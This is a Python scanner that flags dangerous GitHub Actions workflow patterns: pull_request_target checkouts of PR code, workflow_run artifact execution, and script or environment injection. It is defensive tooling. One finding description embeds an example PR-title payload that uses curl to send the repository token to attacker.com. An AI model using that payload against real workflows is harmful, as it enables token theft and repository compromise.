#!/usr/bin/env python3
"""
Pwn Request Scanner
===================
Detects dangerous pull_request_target patterns that enable
PR authors to execute code with elevated privileges.
Based on Ultralytics, Kong, Rspack/Vant real-world exploits.
"""

import re
from typing import List, Dict, Any

from scanners.base_scanner import BaseScanner
from utils.files import find_workflow_files, parse_yaml_safe, read_file_lines


class PwnRequestScanner(BaseScanner):
    """Detect pwn-request vulnerabilities in GitHub Actions workflows."""

    scanner_name = "pwn_request"

    def scan(self) -> List[Dict[str, Any]]:
        self.findings = []

        workflow_files = find_workflow_files(self.config.workspace_dir)

        for filepath in workflow_files:
            if not self.should_scan_file(filepath):
                continue

            lines = read_file_lines(filepath)
            content = "".join(lines)

            # YAML parsing may fail on files with ${{ }} expressions
            workflow = parse_yaml_safe(filepath)

            # These checks need parsed YAML
            if workflow:
                self._check_pull_request_target(filepath, workflow, content, lines)
                self._check_workflow_run(filepath, workflow, content, lines)

            # These checks work on raw text and should always run
            self._check_script_injection(filepath, content, lines)
            self._check_branch_name_injection(filepath, content, lines)

        return self.findings

    def _check_pull_request_target(self, filepath, workflow, content, lines):
        """Check for dangerous pull_request_target usage."""
        triggers = workflow.get("on", workflow.get(True, {}))
        if not isinstance(triggers, dict):
            return

        if "pull_request_target" not in triggers:
            return

        # Check if any job checks out PR head
        jobs = workflow.get("jobs", {})
        for job_name, job_data in (jobs or {}).items():
            if not isinstance(job_data, dict):
                continue

            steps = job_data.get("steps", [])
            for step in (steps or []):
                if not isinstance(step, dict):
                    continue

                uses = step.get("uses", "")
                with_block = step.get("with", {})

                # Check for checkout of PR head ref
                if "actions/checkout" in uses:
                    ref = (with_block or {}).get("ref", "")
                    if any(x in str(ref).lower() for x in [
                        "pull_request.head", "head.sha", "head_ref",
                        "github.event.pull_request.head"
                    ]):
                        line = self._find_line(lines, "pull_request_target")
                        self.add_finding(
                            attack_id="SCA-005",
                            title=f"Pwn Request: pull_request_target checks out PR head in job '{job_name}'",
                            severity="critical",
                            description=f"This workflow uses pull_request_target AND checks out the PR author's code. "
                                        f"This means a PR author can execute arbitrary code with write permissions and access to secrets. "
                                        f"This is the exact pattern used in the Ultralytics attack (SCA-005).",
                            file=filepath,
                            line=line,
                            remediation="Never checkout PR head code with pull_request_target. Use pull_request trigger instead, "
                                        "or if you must use pull_request_target, only checkout the base branch.",
                            cve="",
                            evidence=f"Trigger: pull_request_target, Checkout ref: {ref}",
                        )

                # Check for secrets access in pull_request_target
                run_content = step.get("run", "")
                if isinstance(run_content, str) and "secrets." in content:
                    if re.search(r'secrets\.\w+', run_content):
                        line = self._find_line(lines, run_content[:50])
                        self.add_finding(
                            attack_id="SCA-007",
                            title=f"Secrets accessed in pull_request_target workflow",
                            severity="high",
                            description="Secrets are being accessed in a pull_request_target workflow. "
                                        "If PR code is being executed (even indirectly), these secrets could be exfiltrated.",
                            file=filepath,
                            line=line,
                            remediation="Avoid accessing secrets in workflows triggered by pull_request_target. "
                                        "Use OIDC for cloud authentication instead of stored secrets.",
                            evidence=run_content[:200],
                        )

    def _check_workflow_run(self, filepath, workflow, content, lines):
        """Check for workflow_run privilege escalation."""
        triggers = workflow.get("on", workflow.get(True, {}))
        if not isinstance(triggers, dict):
            return

        if "workflow_run" not in triggers:
            return

        wf_run = triggers.get("workflow_run", {})
        if not isinstance(wf_run, dict):
            return

        # Check if it downloads and executes artifacts
        jobs = workflow.get("jobs", {})
        for job_name, job_data in (jobs or {}).items():
            if not isinstance(job_data, dict):
                continue

            steps = job_data.get("steps", [])
            has_download = False
            has_execution = False

            for step in (steps or []):
                if not isinstance(step, dict):
                    continue

                uses = step.get("uses", "")
                run = step.get("run", "")

                if "download-artifact" in uses or "dawidd6/action-download-artifact" in uses:
                    has_download = True
                if isinstance(run, str) and any(x in run for x in ["bash ", "sh ", "python ", "node ", "chmod +x", "./"]):
                    has_execution = True

            if has_download and has_execution:
                line = self._find_line(lines, "workflow_run")
                self.add_finding(
                    attack_id="SCA-028",
                    title=f"workflow_run downloads and executes artifacts in job '{job_name}'",
                    severity="high",
                    description="This workflow uses workflow_run trigger and downloads artifacts that may be executed. "
                                "An attacker could poison artifacts in a low-privilege workflow to escalate privileges.",
                    file=filepath,
                    line=line,
                    remediation="Validate artifact integrity with checksums. Don't execute downloaded artifacts as code. "
                                "Verify the triggering workflow's conclusion before processing artifacts.",
                    evidence="workflow_run + download-artifact + code execution detected",
                )

    def _check_script_injection(self, filepath, content, lines):
        """Check for expression injection in run blocks."""
        # Untrusted inputs that should never appear in run: blocks
        injection_patterns = [
            (r"\$\{\{\s*github\.event\.pull_request\.title\s*\}\}", "PR title"),
            (r"\$\{\{\s*github\.event\.pull_request\.body\s*\}\}", "PR body"),
            (r"\$\{\{\s*github\.event\.issue\.title\s*\}\}", "Issue title"),
            (r"\$\{\{\s*github\.event\.issue\.body\s*\}\}", "Issue body"),
            (r"\$\{\{\s*github\.event\.comment\.body\s*\}\}", "Comment body"),
            (r"\$\{\{\s*github\.event\.review\.body\s*\}\}", "Review body"),
            (r"\$\{\{\s*github\.event\.head_commit\.message\s*\}\}", "Commit message"),
            (r"\$\{\{\s*github\.head_ref\s*\}\}", "Head ref branch name"),
            (r"\$\{\{\s*github\.event\.discussion\.title\s*\}\}", "Discussion title"),
            (r"\$\{\{\s*github\.event\.discussion\.body\s*\}\}", "Discussion body"),
        ]

        in_run_block = False
        for i, line in enumerate(lines, 1):
            stripped = line.strip()

            # Track if we're in a run: block
            if re.match(r'^\s*run:\s*\|?\s*$', stripped) or re.match(r'^\s*run:\s*\S', stripped):
                in_run_block = True
            elif re.match(r'^\s*\w+:', stripped) and not stripped.startswith('-') and "run:" not in stripped:
                if not stripped.startswith('#'):
                    in_run_block = False

            if in_run_block or "run:" in stripped:
                for pattern, input_name in injection_patterns:
                    if re.search(pattern, line):
                        self.add_finding(
                            attack_id="SCA-026",
                            title=f"Script injection via untrusted input: {input_name}",
                            severity="high",
                            description=f"Untrusted input ({input_name}) is directly interpolated in a run: block. "
                                        f"An attacker can inject arbitrary shell commands through this input. "
                                        f"For example, a PR with title `\"; curl attacker.com/steal?t=$GITHUB_TOKEN \"` "
                                        f"would exfiltrate the repository token.",
                            file=filepath,
                            line=i,
                            remediation=f"Pass {input_name} as an environment variable instead:\n"
                                        f"  env:\n    INPUT_VALUE: ${{{{ github.event... }}}}\n"
                                        f"  run: echo \"$INPUT_VALUE\"",
                            evidence=stripped[:200],
                        )

    def _check_branch_name_injection(self, filepath, content, lines):
        """Check for branch name injection in env/output."""
        env_injection_patterns = [
            (r"\$\(.*\)\s*>>\s*\$GITHUB_ENV", "GITHUB_ENV command injection"),
            (r"\$\(.*\)\s*>>\s*\$GITHUB_PATH", "GITHUB_PATH command injection"),
            (r"\$\(.*\)\s*>>\s*\$GITHUB_OUTPUT", "GITHUB_OUTPUT command injection"),
        ]

        for i, line in enumerate(lines, 1):
            for pattern, desc in env_injection_patterns:
                if re.search(pattern, line):
                    self.add_finding(
                        attack_id="SCA-027",
                        title=f"Environment injection: {desc}",
                        severity="critical",
                        description=f"Command substitution output is written to {desc.split()[0]}. "
                                    f"If the command output is influenced by untrusted input (branch names, PR data), "
                                    f"an attacker can inject arbitrary environment variables or PATH entries.",
                        file=filepath,
                        line=i,
                        remediation="Sanitize all inputs before writing to GITHUB_ENV/GITHUB_PATH/GITHUB_OUTPUT. "
                                    "Use delimiters for multi-line values.",
                        evidence=line.strip()[:200],
                    )

    def _find_line(self, lines, search_text):
        """Find the line number containing search_text."""
        if not search_text:
            return 0
        for i, line in enumerate(lines, 1):
            if search_text in line:
                return i
        return 0
